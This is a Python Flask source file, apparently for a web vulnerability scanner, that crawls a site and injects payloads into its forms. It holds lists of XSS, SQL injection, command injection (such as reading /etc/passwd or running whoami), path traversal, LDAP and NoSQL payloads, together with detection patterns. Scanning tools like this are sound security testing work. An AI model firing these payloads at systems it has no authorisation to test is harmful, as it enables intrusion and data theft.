# app.py
# Flask Web Application Vulnerability Scanner Backend - Faster and More Robust

import re
import json
import time
from flask import Flask, request, jsonify, render_template_string
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

# Initialize the Flask application
app = Flask(__name__)

# Global session for persistent connections and headers
# Using a session improves performance by reusing TCP connections.
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 WebVulnerabilityScanner/1.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
})

# --- Configuration ---
MAX_CRAWL_DEPTH = 50  # Limit crawling depth for demonstration to prevent infinite scans
MAX_WORKERS = 10      # Number of concurrent threads for scanning
REQUEST_TIMEOUT = 15  # Timeout for HTTP requests in seconds (increased slightly for robustness)
REQUEST_DELAY = 0.1   # Delay between requests (in seconds) to avoid overwhelming target and for basic rate limiting

# --- Vulnerability Payloads ---
# These are common payloads used to test for vulnerabilities.
# In a real-world scenario, these lists would be much more extensive.

# Cross-Site Scripting (XSS) Payloads
# These payloads attempt to execute JavaScript in the browser.
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    # Additional XSS Payloads
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\" />",
    "<body onpageshow=\"alert('XSS')\">",
    "<div onmouseover=\"alert('XSS')\">Hover over me</div>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\" autofocus>",
    "<details open ontoggle=\"alert('XSS')\">",
    "<marquee onstart=\"alert('XSS')\">",
    "<isindex action=\"javascript:alert('XSS')\" type=text>",
    "<object data=\"javascript:alert('XSS')\">",
    "<embed src=\"javascript:alert('XSS')\">",
    "<form action=\"javascript:alert('XSS')\"><input type=submit value=XSS>",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
    "<table background=\"javascript:alert('XSS')\">",
    "<div style=\"background-image: url(javascript:alert('XSS'))\">",
    "<img src=x:alert(alt) onerror=eval(src) alt=XSS>",
    "<video poster=javascript:alert(1)></video>",
    "<audio src=javascript:alert(1)></audio>",
    "<img src=data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 onload=alert('XSS')>",
    "<input onfocus=alert(document.cookie) autofocus>", # For cookie stealing example
    "<svg><script>alert('XSS')</script></svg>",
    "\"-alert(1)-", # Simple reflected XSS
    "`alert(1)`", # Backtick for template literals
    "'-alert(1)-'",
    "';alert(1);",
    "\"';!--\"<XSS>=&{()}", # Polyglot
    "<img \"\"\"\"><script>alert(\"XSS\")</script>"
]

# SQL Injection (SQLi) Payloads
# These payloads attempt to manipulate SQL queries to gain unauthorized access or information.
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' UNION SELECT @@version,NULL,NULL--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "\" OR 1=1 --",
    "\" OR 1=1 /*",
    # Additional SQLi Payloads
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 10--", # Test for number of columns
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' OR 1=2--",
    "1\" OR 1=1--",
    "1\" AND 1=2--",
    "1\" OR 1=2--",
    "1; SELECT SLEEP(5)--", # Time-based blind SQLi (MySQL)
    "1; WAITFOR DELAY '0:0:5'--", # Time-based blind SQLi (MSSQL)
    "1' UNION SELECT @@version, user(), database()--", # Information gathering
    "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--", # More columns
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", # Time-based for various DBs
    "1' OR SLEEP(5)--",
    "1' OR 1=1 LIMIT 1--",
    "1' OR 'a'='a",
    "\" OR \"a\"=\"a",
    "1' XOR 1=1",
    "1' XOR 1=2",
    "1' AND '0'='0",
    "1' AND '0'='1",
    "1' AND 1=1",
    "1' AND 1=0",
    "1' AND (SELECT 1 FROM DUAL WHERE 1=1)--", # Oracle specific
    "1' AND (SELECT 1 FROM DUAL WHERE 1=0)--", # Oracle specific
    "1' AND 1=CONVERT(int,(SELECT @@version))--", # MSSQL specific
    "1' AND 1=CAST((SELECT @@version) AS INT)--", # MSSQL specific
    "1' AND 1=CAST(1 AS int)/(CASE WHEN 1=1 THEN 1 ELSE 0 END)--", # Division by zero for error
    "1' AND 1=CAST(1 AS int)/(CASE WHEN 1=0 THEN 1 ELSE 0 END)--", # Division by zero for error
    "1' OR 1=1 #",
    "1' OR 1=1 /*",
    "1' OR 'x'='x",
    "1' OR 'y'='y", # Corrected from 'x'='y' to 'y'='y' for a true condition
    "1' OR 1=1-- -", # Common bypass
    "1' AND 1=1 UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=1 UNION SELECT 1,2,3--",
    "1' AND 1=1 UNION SELECT 'abc','def','ghi'--",
    "1' AND 1=1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--", # Table enumeration (MySQL)
    "1' AND 1=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--", # Column enumeration (MySQL)
]

# Command Injection Payloads
# These payloads attempt to execute arbitrary OS commands on the server.
COMMAND_INJECTION_PAYLOADS = [
    "& dir", # Windows
    "& ls", # Linux
    "| dir",
    "| ls",
    "; dir",
    "; ls",
    "&& dir",
    "&& ls",
    "`dir`", # Backticks for command execution
    "`ls`",
    "$(dir)", # Command substitution
    "$(ls)",
    "| cat /etc/passwd", # Linux sensitive file
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts", # Windows sensitive file
    "|| dir",
    "|| ls",
    "& ping -n 1 127.0.0.1", # Windows ping
    "& ping -c 1 127.0.0.1", # Linux ping
    "; ping -n 1 127.0.0.1",
    "; ping -c 1 127.0.0.1",
    "| whoami", # Linux/Windows user
    "& whoami",
    "; whoami",
]

# Path Traversal Payloads
# These payloads attempt to access files and directories outside of the intended web root.
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", # Linux
    "../../../../windows/system32/drivers/etc/hosts", # Windows
    "....//....//....//....//etc/passwd", # Bypass
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", # URL encoded
    "file://etc/passwd", # File URI scheme
    "file:///etc/passwd",
    "../",
    "..%2f",
    "..\\",
    "..%5c",
    "../../../../boot.ini", # Windows boot file
    "../../../../proc/self/environ", # Linux environment variables
    "../../../../WEB-INF/web.xml", # Java web app config
]

# LDAP Injection Payloads
# These payloads attempt to manipulate LDAP queries.
LDAP_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "*)(cn=admin))((",
    "*)(objectClass=*)",
    "admin)(cn=*))",
    "*,cn=users,dc=example,dc=com",
    "\" or \"\"=\"",
    "\"*\"=\"",
    "&",
    "|",
    ";",
    "()",
    "!",
    "=",
    ">=",
    "<=",
    "~=",
    "\\",
    "\\\\",
    "\\28", # URL encoded (
    "\\29", # URL encoded )
    "\\2a", # URL encoded *
]

# NoSQL Injection Payloads (MongoDB-focused examples)
# These payloads attempt to manipulate NoSQL queries, often by breaking out of JSON/BSON structures.
NOSQL_PAYLOADS = [
    "{'$ne': null}", # Always true condition
    "{'$gt': ''}",   # Always true condition
    "{$where: '1 == 1'}", # JavaScript injection
    "{$where: 'sleep(5000)'}", # Time-based blind NoSQLi
    "'; return true; var foo = '", # Simple JS injection
    "'; return false; var foo = '",
    "{'username': {'$ne': null}, 'password': {'$ne': null}}",
    "{'username': 'admin', '$where': 'this.password.length > 0'}",
    "admin' || '1'=='1",
    "admin' || 1==1",
    "admin' || 1",
    "admin' && 1==0",
    "admin' && 1==1",
]


# --- Regular Expressions for Vulnerability Detection ---
# These regex patterns are used to identify signs of vulnerabilities in the HTTP response.

# XSS Detection: Look for reflection of script tags or common XSS functions.
XSS_DETECTION_PATTERNS = [
    re.compile(r"<script[^>]*>.*alert\(['\"]XSS['\"]\).*</script>", re.IGNORECASE | re.DOTALL),
    re.compile(r"onerror=alert\(['\"]XSS['\"]\)", re.IGNORECASE),
    re.compile(r"onload=alert\(['\"]XSS['\"]\)", re.IGNORECASE),
    re.compile(r"javascript:alert\(['\"]XSS['\"]\)", re.IGNORECASE),
    re.compile(r"confirm\(['\"]XSS['\"]\)", re.IGNORECASE), # Added for confirm()
    re.compile(r"prompt\(['\"]XSS['\"]\)", re.IGNORECASE), # Added for prompt()
    re.compile(r"<input[^>]+onfocus=\"alert\('XSS'\)\"", re.IGNORECASE),
    re.compile(r"<div[^>]+onmouseover=\"alert\('XSS'\)\"", re.IGNORECASE),
    re.compile(r"alert\(document\.cookie\)", re.IGNORECASE), # For cookie stealing
    re.compile(r"alert\(1\)", re.IGNORECASE), # Generic alert(1)
    re.compile(r"eval\(src\)", re.IGNORECASE), # For eval(src) in img tag
    re.compile(r"<details[^>]+ontoggle=\"alert\('XSS'\)\"", re.IGNORECASE),
    re.compile(r"<marquee[^>]+onstart=\"alert\('XSS'\)\"", re.IGNORECASE),
    re.compile(r"<video[^>]+poster=javascript:alert\(1\)", re.IGNORECASE),
    re.compile(r"<audio[^>]+src=javascript:alert\(1\)", re.IGNORECASE),
]

# SQLi Detection: Look for common SQL error messages.
SQLI_ERROR_PATTERNS = [
    re.compile(r"SQL syntax", re.IGNORECASE),
    re.compile(r"mysql_fetch_array()", re.IGNORECASE),
    re.compile(r"You have an error in your SQL syntax", re.IGNORECASE),
    re.compile(r"Warning: mysql_", re.IGNORECASE),
    re.compile(r"supplied argument is not a valid MySQL result", re.IGNORECASE),
    re.compile(r"ODBC Microsoft Access Driver", re.IGNORECASE),
    re.compile(r"ORA-[0-9]{5}", re.IGNORECASE), # Oracle errors
    re.compile(r"Unclosed quotation mark", re.IGNORECASE),
    re.compile(r"Incorrect syntax near", re.IGNORECASE),
    # Additional SQLi error patterns
    re.compile(r"SQLSTATE\[", re.IGNORECASE), # PDO errors
    re.compile(r"Fatal error: Uncaught PDOException", re.IGNORECASE),
    re.compile(r"Pg error", re.IGNORECASE), # PostgreSQL errors
    re.compile(r"PostgreSQL.*error", re.IGNORECASE),
    re.compile(r"Microsoft OLE DB Provider for SQL Server", re.IGNORECASE),
    re.compile(r"\[SQLSTATE", re.IGNORECASE),
    re.compile(r"System\.Data\.SqlClient\.SqlException", re.IGNORECASE), # .NET SQL errors
    re.compile(r"java\.sql\.SQLException", re.IGNORECASE), # Java SQL errors
    re.compile(r"org\.hibernate\.exception", re.IGNORECASE), # Hibernate errors
    re.compile(r"valid MySQL result", re.IGNORECASE),
    re.compile(r"syntax error at or near", re.IGNORECASE), # PostgreSQL specific
    re.compile(r"SQL command not properly ended", re.IGNORECASE), # Oracle specific
    re.compile(r"quoted string not properly terminated", re.IGNORECASE), # PostgreSQL/Oracle
    re.compile(r"Division by zero", re.IGNORECASE), # For error-based SQLi
]

# Command Injection Detection: Look for output of common commands.
COMMAND_INJECTION_DETECTION_PATTERNS = [
    re.compile(r"volume in drive", re.IGNORECASE), # dir output (Windows)
    re.compile(r"directory of", re.IGNORECASE), # dir output (Windows)
    re.compile(r"total \d+", re.IGNORECASE), # ls -l output (Linux)
    re.compile(r"root:x:", re.IGNORECASE), # /etc/passwd content (Linux)
    re.compile(r"uid=\d+\(.*\) gid=\d+\(.*\) groups=\d+\(.*?\)", re.IGNORECASE), # whoami output (Linux)
    re.compile(r"nt authority\\system", re.IGNORECASE), # whoami output (Windows)
    re.compile(r"ping statistics", re.IGNORECASE), # Ping output
    re.compile(r"bytes from", re.IGNORECASE), # Ping output
]

# Path Traversal Detection: Look for content of sensitive files.
PATH_TRAVERSAL_DETECTION_PATTERNS = [
    re.compile(r"root:x:[0-9]+:[0-9]+:", re.IGNORECASE), # /etc/passwd content
    re.compile(r"localhost", re.IGNORECASE), # hosts file content
    re.compile(r"\[boot loader\]", re.IGNORECASE), # boot.ini content (Windows)
    re.compile(r"user|pwd|password|secret", re.IGNORECASE), # Generic for config files
    re.compile(r"WEB-INF", re.IGNORECASE), # For web.xml or similar
    re.compile(r"servlet-name", re.IGNORECASE), # For web.xml or similar
]

# LDAP Injection Detection: Look for common LDAP error messages or specific responses.
LDAP_DETECTION_PATTERNS = [
    re.compile(r"LDAP Error", re.IGNORECASE),
    re.compile(r"Invalid DN syntax", re.IGNORECASE),
    re.compile(r"Unwilling to perform", re.IGNORECASE),
    re.compile(r"Protocol error", re.IGNORECASE),
    re.compile(r"Size limit exceeded", re.IGNORECASE),
    re.compile(r"Operations error", re.IGNORECASE),
]

# NoSQL Injection Detection: Look for common NoSQL error messages or behavioral changes.
NOSQL_DETECTION_PATTERNS = [
    re.compile(r"SyntaxError: Unexpected token", re.IGNORECASE), # JavaScript errors
    re.compile(r"MongoDB.Driver.MongoException", re.IGNORECASE), # MongoDB errors
    re.compile(r"Uncaught exception", re.IGNORECASE),
    re.compile(r"Invalid JSON", re.IGNORECASE),
    re.compile(r"document is not valid JSON", re.IGNORECASE),
    re.compile(r"timeout", re.IGNORECASE), # For time-based blind NoSQLi
]

# Sensitive Data Exposure Detection: Look for common sensitive data patterns.
SENSITIVE_DATA_PATTERNS = [
    re.compile(r"\b(?:credit card|cc|card number|visa|mastercard|amex)\b(?:\s*[:=]\s*)?\d{13,16}\b", re.IGNORECASE), # Credit card numbers
    re.compile(r"\b(?:ssn|social security number)\b(?:\s*[:=]\s*)?\d{3}-\d{2}-\d{4}\b", re.IGNORECASE), # SSN (US format)
    re.compile(r"\b(?:password|passwd|pwd)\b(?:\s*[:=]\s*)[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':\"\\|,.<>\/?`~]{5,}\b", re.IGNORECASE), # Generic passwords
    re.compile(r"\b(?:api_key|apikey|auth_token|token)\b(?:\s*[:=]\s*)[a-f0-9]{32,64}\b", re.IGNORECASE), # API keys/tokens (hex)
    re.compile(r"-----BEGIN PRIVATE KEY-----.*?-----END PRIVATE KEY-----", re.IGNORECASE | re.DOTALL), # Private keys
    re.compile(r"jdbc:mysql://\S+:\d+/\S+", re.IGNORECASE), # JDBC connection strings
    re.compile(r"mongodb://\S+:\d+/\S+", re.IGNORECASE), # MongoDB connection strings
    re.compile(r"ftp:\/\/(?:[a-zA-Z0-9]+:[a-zA-Z0-9]+@)?\S+", re.IGNORECASE), # FTP credentials
    re.compile(r"s3\.amazonaws\.com\/\S+", re.IGNORECASE), # S3 bucket exposure
    re.compile(r"client_secret", re.IGNORECASE), # OAuth client secrets
]


# --- Helper Functions ---

def normalize_url(url):
    """Normalizes a URL to prevent duplicate scanning of the same resource."""
    parsed = urlparse(url)
    # Remove fragments
    parsed = parsed._replace(fragment='')
    # Sort query parameters
    query_params = parse_qs(parsed.query)
    sorted_query = urlencode(sorted(query_params.items()), doseq=True)
    parsed = parsed._replace(query=sorted_query)
    # Remove trailing slash if it's not the root
    path = parsed.path
    if path.endswith('/') and len(path) > 1:
        parsed = parsed._replace(path=path.rstrip('/'))
    return urlunparse(parsed)

def fetch_url_content(url):
    """
    Fetches the content of a given URL using the global session.
    Handles potential network errors and returns response or None.
    """
    print(f"[SCANNER]: Fetching URL: {url}")
    try:
        # WARNING: verify=False is used for testing with self-signed certificates or HTTP sites.
        # In a production environment, this should always be True to enforce SSL/TLS verification.
        response = session.get(url, timeout=REQUEST_TIMEOUT, verify=False)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        return response
    except requests.exceptions.Timeout:
        print(f"[ERROR]: Request timed out for {url} after {REQUEST_TIMEOUT} seconds.")
        return None
    except requests.exceptions.ConnectionError as e:
        print(f"[ERROR]: Connection error for {url}: {e}")
        return None
    except requests.exceptions.HTTPError as e:
        print(f"[ERROR]: HTTP error for {url}: {e.response.status_code} {e.response.reason}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[ERROR]: An unexpected request error occurred for {url}: {e}")
        return None
    finally:
        # Apply a small delay after each request to avoid overwhelming the target
        time.sleep(REQUEST_DELAY)

def find_forms_and_inputs(soup, base_url):
    """
    Finds all forms and input fields within a BeautifulSoup object.
    Extracts action URL, method, and input field names.
    """
    forms_data = []
    for form in soup.find_all('form'):
        action = form.get('action')
        method = form.get('method', 'get').lower() # Default to GET if method is not specified

        # Resolve relative URLs
        if action and not action.startswith(('http://', 'https://')):
            action = requests.compat.urljoin(base_url, action)
        elif not action: # If action is empty, it refers to the current URL
            action = base_url

        inputs = {}
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            name = input_tag.get('name')
            if name:
                inputs[name] = input_tag.get('value', '') # Get default value, if any
        forms_data.append({'action': action, 'method': method, 'inputs': inputs})
    return forms_data

def find_links(soup, base_url):
    """
    Finds all links within a BeautifulSoup object.
    """
    links = []
    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        if href and not href.startswith(('http://', 'https://', '#', 'javascript:')):
            href = requests.compat.urljoin(base_url, href)
        if href and href.startswith(('http://', 'https://')):
            links.append(normalize_url(href)) # Normalize links before adding
    return list(set(links)) # Return unique links

def perform_injection_test(url, input_name, payload, method, base_inputs, vuln_type, detection_patterns, severity):
    """
    Generic function to perform an injection test and check for vulnerabilities.
    """
    vulnerabilities = []
    data = base_inputs.copy()
    data[input_name] = payload

    try:
        if method == 'post':
            response = session.post(url, data=data, timeout=REQUEST_TIMEOUT, verify=False)
        else: # GET
            response = session.get(url, params=data, timeout=REQUEST_TIMEOUT, verify=False)

        response_content = response.text

        for pattern in detection_patterns:
            if pattern.search(response_content):
                vulnerabilities.append({
                    'type': vuln_type,
                    'url': url,
                    'method': method.upper(),
                    'input': input_name,
                    'payload': payload,
                    'evidence': response_content[:500], # Log first 500 chars of response as evidence
                    'severity': severity
                })
                print(f"[VULN FOUND]: {vuln_type} at {url} via input '{input_name}' with payload '{payload}'")
                break # Found vulnerability, no need to check other patterns for this payload
    except requests.exceptions.RequestException as e:
        print(f"[ERROR]: {vuln_type} check failed on {url} with payload {payload}: {e}")
    finally:
        time.sleep(REQUEST_DELAY) # Apply rate limiting
    return vulnerabilities

def check_xss(url, input_name, payload, method, base_inputs):
    return perform_injection_test(url, input_name, payload, method, base_inputs, 'XSS', XSS_DETECTION_PATTERNS, 'High')

def check_sqli(url, input_name, payload, method, base_inputs):
    return perform_injection_test(url, input_name, payload, method, base_inputs, 'SQL Injection', SQLI_ERROR_PATTERNS, 'Critical')

def check_command_injection(url, input_name, payload, method, base_inputs):
    return perform_injection_test(url, input_name, payload, method, base_inputs, 'Command Injection', COMMAND_INJECTION_DETECTION_PATTERNS, 'Critical')

def check_path_traversal(url, input_name, payload, method, base_inputs):
    return perform_injection_test(url, input_name, payload, method, base_inputs, 'Path Traversal', PATH_TRAVERSAL_DETECTION_PATTERNS, 'High')

def check_ldap_injection(url, input_name, payload, method, base_inputs):
    return perform_injection_test(url, input_name, payload, method, base_inputs, 'LDAP Injection', LDAP_DETECTION_PATTERNS, 'Critical')

def check_nosql_injection(url, input_name, payload, method, base_inputs):
    return perform_injection_test(url, input_name, payload, method, base_inputs, 'NoSQL Injection', NOSQL_DETECTION_PATTERNS, 'Critical')

def check_sensitive_data_exposure(url, response_content):
    """
    Checks the response content for patterns of sensitive data.
    """
    vulnerabilities = []
    for pattern in SENSITIVE_DATA_PATTERNS:
        matches = pattern.findall(response_content)
        if matches:
            for match in matches:
                # Mask sensitive data in evidence for logging, but show type
                evidence_snippet = response_content[:500].replace(match, '[MASKED_SENSITIVE_DATA]')
                vulnerabilities.append({
                    'type': 'Sensitive Data Exposure (Cryptographic Failures)',
                    'url': url,
                    'method': 'GET', # Assumed from page content
                    'input': 'Page Content',
                    'payload': f"Detected pattern: {pattern.pattern}",
                    'evidence': evidence_snippet,
                    'severity': 'High'
                })
                print(f"[VULN FOUND]: Sensitive Data Exposure at {url} with pattern '{pattern.pattern}'")
    return vulnerabilities

def check_clickjacking(url, response_headers):
    """
    Checks HTTP headers for Clickjacking protection (X-Frame-Options, Content-Security-Policy).
    """
    vulnerabilities = []
    x_frame_options = response_headers.get('X-Frame-Options', '').lower()
    csp = response_headers.get('Content-Security-Policy', '').lower()

    if not x_frame_options and 'frame-ancestors' not in csp:
        vulnerabilities.append({
            'type': 'Clickjacking (Missing Protection)',
            'url': url,
            'method': 'GET',
            'input': 'Headers',
            'payload': 'Missing X-Frame-Options or Content-Security-Policy: frame-ancestors header.',
            'evidence': f"Headers: {response_headers}",
            'severity': 'Medium'
        })
        print(f"[VULN FOUND]: Clickjacking (Missing Protection) at {url}")
    elif x_frame_options not in ['deny', 'sameorigin']:
        vulnerabilities.append({
            'type': 'Clickjacking (Weak X-Frame-Options)',
            'url': url,
            'method': 'GET',
            'input': 'Headers',
            'payload': f"X-Frame-Options: {x_frame_options} (should be DENY or SAMEORIGIN)",
            'evidence': f"Headers: {response_headers}",
            'severity': 'Medium'
        })
        print(f"[VULN FOUND]: Clickjacking (Weak X-Frame-Options) at {url}")
    elif 'frame-ancestors' in csp and ('none' not in csp and 'self' not in csp and '*' in csp):
         vulnerabilities.append({
            'type': 'Clickjacking (Weak CSP frame-ancestors)',
            'url': url,
            'method': 'GET',
            'input': 'Headers',
            'payload': f"Content-Security-Policy: {csp} (frame-ancestors should be 'none' or 'self')",
            'evidence': f"Headers: {response_headers}",
            'severity': 'Medium'
        })
         print(f"[VULN FOUND]: Clickjacking (Weak CSP frame-ancestors) at {url}")
    return vulnerabilities


def check_csrf_token(form_html):
    """
    Checks if a form contains a CSRF token.
    This is a basic check and doesn't confirm CSRF vulnerability,
    but rather the presence of protection.
    """
    # Look for common CSRF token patterns (e.g., hidden input with 'csrf' in name/id)
    # This regex is improved to catch more variations of CSRF token names/IDs
    if re.search(r'<input[^>]+type=["\']hidden["\'][^>]+(name|id)=["\'](?:_?csrf_?token|authenticity_token|__RequestVerificationToken|csrf_token|token|nonce)["\']', form_html, re.IGNORECASE):
        return True
    return False

# --- Main Scanning Logic ---

def scan_website(target_url):
    """
    Performs a comprehensive vulnerability scan on the target URL.
    Uses ThreadPoolExecutor for concurrent scanning.
    """
    all_vulnerabilities = []
    scanned_urls = set()
    urls_to_scan = [normalize_url(target_url)] # Normalize initial URL
    
    # Use a set for efficient lookup of URLs that are already in the queue or scanned
    queued_urls = {urls_to_scan[0]} # Add normalized initial URL to queued

    print(f"[SCANNER]: Starting scan for: {target_url}")
    print(f"[SCANNER]: Max crawl depth: {MAX_CRAWL_DEPTH}, Max workers: {MAX_WORKERS}, Request timeout: {REQUEST_TIMEOUT}s, Request delay: {REQUEST_DELAY}s")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {} # Stores futures for crawling
        
        # Initial crawl of the target URL
        initial_response = fetch_url_content(urls_to_scan[0])
        if initial_response:
            futures[executor.submit(process_url, urls_to_scan[0], initial_response)] = urls_to_scan[0]

        while futures and len(scanned_urls) < MAX_CRAWL_DEPTH:
            # Process completed futures
            completed_futures = as_completed(list(futures.keys())) # Create a list to iterate over a copy
            for future in completed_futures:
                url_processed = futures.pop(future)
                scanned_urls.add(url_processed)
                
                try:
                    page_vulnerabilities, new_links_found = future.result()
                    all_vulnerabilities.extend(page_vulnerabilities)

                    for link in new_links_found:
                        normalized_link = normalize_url(link)
                        # Only add links that are within the target domain and not already processed/queued
                        if normalized_link.startswith(normalize_url(target_url).split('?')[0].split('#')[0]) and \
                           normalized_link not in scanned_urls and \
                           normalized_link not in queued_urls and \
                           len(scanned_urls) + len(futures) < MAX_CRAWL_DEPTH: # Check total limit
                            urls_to_scan.append(normalized_link)
                            queued_urls.add(normalized_link) # Mark as queued
                            print(f"[CRAWLER]: Found new link: {normalized_link}")

                except Exception as exc:
                    print(f"[ERROR]: Processing URL {url_processed} generated an exception: {exc}")

            # Submit new URLs from the queue if there are available workers
            while urls_to_scan and len(futures) < MAX_WORKERS and len(scanned_urls) + len(futures) < MAX_CRAWL_DEPTH:
                next_url = urls_to_scan.pop(0)
                print(f"[SCANNER]: Submitting for processing: {next_url}")
                # Submit a task to fetch content and then process it
                futures[executor.submit(fetch_and_process_url, next_url)] = next_url
            
            # If no new futures were submitted and there are still URLs to scan,
            # it means we hit MAX_WORKERS or MAX_CRAWL_DEPTH.
            # If futures are empty but urls_to_scan is not, it means all workers are busy
            # or we reached the crawl limit.
            if not futures and urls_to_scan and len(scanned_urls) < MAX_CRAWL_DEPTH:
                print("[SCANNER]: Crawl queue not empty but no active workers or crawl depth limit reached. Finishing current tasks.")
                break # Exit if no more tasks can be submitted but queue still has items

    print(f"[SCANNER]: Scan finished. Processed {len(scanned_urls)} URLs. Found {len(all_vulnerabilities)} vulnerabilities.")

    # Note on Broken Access Control:
    # Automated detection of Broken Access Control is highly complex as it requires
    # understanding user roles, permissions, and authenticated sessions. This simple scanner
    # does not implement advanced authentication/authorization logic.
    # A manual review or more sophisticated tools are typically needed for this.
    # For a basic check, one might try accessing known admin paths (e.g., /admin, /dashboard)
    # without authentication, but this is often too simplistic for real-world scenarios.
    # This scanner does not perform explicit Broken Access Control checks beyond basic crawling.

    # Note on "All Types of Websites" (Robustness for modern web apps):
    # This scanner relies on static HTML parsing (requests + BeautifulSoup).
    # It WILL NOT effectively scan:
    # 1. Single-Page Applications (SPAs) that heavily rely on JavaScript to load content.
    #    A headless browser (e.g., Selenium, Playwright) would be required to execute JavaScript
    #    and interact with dynamic elements.
    # 2. Websites requiring authentication (login, sessions). This scanner does not manage sessions
    #    beyond basic cookie handling by requests.Session.
    # 3. Websites with strong Anti-Bot mechanisms or Web Application Firewalls (WAFs) that block
    #    automated requests or simple payloads.
    # 4. Complex business logic vulnerabilities. These require deep understanding of the application's
    #    functionality and cannot be detected by generic payload injection and regex matching.
    # For comprehensive scanning of modern web applications, more advanced and specialized tools are necessary.

    return all_vulnerabilities

def fetch_and_process_url(url):
    """Fetches URL content and then processes it for vulnerabilities and new links."""
    response = fetch_url_content(url)
    if not response:
        return [], [] # Return empty lists if fetch fails

    return process_url(url, response)

def process_url(url, response):
    """Processes a URL's content for vulnerabilities and extracts new links."""
    page_vulnerabilities = []
    soup = BeautifulSoup(response.text, 'html.parser')

    # Check for Sensitive Data Exposure on the current page content
    page_vulnerabilities.extend(check_sensitive_data_exposure(url, response.text))

    # Check for Clickjacking on the current page's headers
    page_vulnerabilities.extend(check_clickjacking(url, response.headers))

    # Find and process forms
    forms = find_forms_and_inputs(soup, url)
    if forms:
        print(f"[SCANNER]: Found {len(forms)} forms on {url}. Testing inputs...")
    for form in forms:
        form_action = form['action']
        form_method = form['method']
        form_inputs = form['inputs']

        # Check for CSRF token presence
        if not check_csrf_token(str(form)):
            page_vulnerabilities.append({
                'type': 'CSRF (Potential - Missing Token)',
                'url': url,
                'method': 'N/A',
                'input': 'Form',
                'payload': 'No common CSRF token pattern found in form.',
                'evidence': str(form)[:500],
                'severity': 'Medium'
            })
            print(f"[VULN FOUND]: CSRF (Missing Token) on form at {url}")

        # Test each input field in the form with various injection types
        for input_name in form_inputs:
            # XSS Testing
            for xss_payload in XSS_PAYLOADS:
                page_vulnerabilities.extend(check_xss(form_action, input_name, xss_payload, form_method, form_inputs))

            # SQLi Testing
            for sqli_payload in SQLI_PAYLOADS:
                page_vulnerabilities.extend(check_sqli(form_action, input_name, sqli_payload, form_method, form_inputs))

            # Command Injection Testing
            for ci_payload in COMMAND_INJECTION_PAYLOADS:
                page_vulnerabilities.extend(check_command_injection(form_action, input_name, ci_payload, form_method, form_inputs))

            # Path Traversal Testing (Directory Traversal)
            for pt_payload in PATH_TRAVERSAL_PAYLOADS:
                page_vulnerabilities.extend(check_path_traversal(form_action, input_name, pt_payload, form_method, form_inputs))

            # LDAP Injection Testing
            for ldap_payload in LDAP_PAYLOADS:
                page_vulnerabilities.extend(check_ldap_injection(form_action, input_name, ldap_payload, form_method, form_inputs))

            # NoSQL Injection Testing
            for nosql_payload in NOSQL_PAYLOADS:
                page_vulnerabilities.extend(check_nosql_injection(form_action, input_name, nosql_payload, form_method, form_inputs))
    
    new_links = find_links(soup, url)
    return page_vulnerabilities, new_links


# --- Flask Routes ---

@app.route('/')
def index():
    """
    Serves the HTML frontend.
    """
    # This is a simple way to serve the HTML. In a real app, you'd use render_template('index.html')
    # and have index.html in a 'templates' folder.
    # For this self-contained example, we'll embed the HTML directly.
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Web Vulnerability Scanner</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
        <style>
            body {
                font-family: 'Roboto Mono', monospace;
                background-color: #0a0a0a; /* Dark background */
                color: #00ff00; /* Green text for CLI feel */
            }
            .terminal-container {
                max-width: 900px;
                background-color: #1a1a1a; /* Darker terminal background */
                border: 1px solid #00ff00; /* Green border */
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.5); /* Green glow */
                padding: 2rem;
                border-radius: 8px;
            }
            .terminal-header {
                color: #00ff00;
                text-align: center;
                margin-bottom: 1.5rem;
                font-size: 2rem;
                font-weight: bold;
